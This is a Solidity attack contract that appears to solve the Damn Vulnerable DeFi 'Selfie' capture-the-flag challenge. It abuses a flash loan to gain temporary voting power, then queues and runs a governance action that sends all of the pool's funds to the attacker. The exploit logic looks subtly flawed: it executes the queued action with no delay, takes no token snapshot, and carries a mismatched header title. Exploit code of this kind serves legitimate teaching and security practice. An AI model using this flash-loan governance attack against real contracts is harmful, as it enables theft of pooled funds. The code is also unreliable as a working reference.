// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackSelfie {

    ERC20Snapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;

    constructor(address tokenAddress, address governanceAddress, address poolAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        pool = SelfiePool(poolAddress);
    }

    function receiveTokens(address _token, uint256 borrowAmmount) public {
        bytes memory data = abi.encodeWithSignature('drainAllFunds(address)', tx.origin);
        uint256 id = governance.queueAction(address(pool), data, 0);
        token.transfer(address(pool), borrowAmmount);
        governance.executeAction(id);
    }

    function attack() public {
        pool.flashLoan( token.balanceOf(address(pool)) );

    }

}